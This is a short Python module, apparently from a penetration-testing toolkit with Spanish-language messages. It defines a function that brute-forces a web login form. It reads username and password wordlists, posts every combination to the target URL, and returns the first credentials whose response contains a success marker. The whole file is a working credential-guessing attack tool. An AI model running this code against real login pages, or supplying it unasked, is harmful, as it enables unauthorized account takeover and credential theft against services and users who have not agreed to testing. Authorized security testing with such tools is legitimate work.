# modules/bruteforcer.py

import requests

def bruteforce_login(url, user_field, pass_field, success_indicator, user_list, pass_list):
    results = []
    headers = {"User-Agent": "Mozilla/5.0 (PentestingBot)"}

    try:
        with open(user_list, 'r') as users, open(pass_list, 'r') as passwords:
            for username in users:
                username = username.strip()
                for password in passwords:
                    password = password.strip()

                    data = {
                        user_field: username,
                        pass_field: password
                    }

                    response = requests.post(url, data=data, headers=headers)

                    if success_indicator in response.text:
                        return f"✅ ¡Acceso exitoso!\nUsuario: `{username}`\nClave: `{password}`"
                
                passwords.seek(0)  # Reiniciar passwords para el siguiente user
        return "❌ No se logró acceso con las combinaciones probadas."

    except Exception as e:
        return f"⚠️ Error durante la fuerza bruta: {str(e)}"
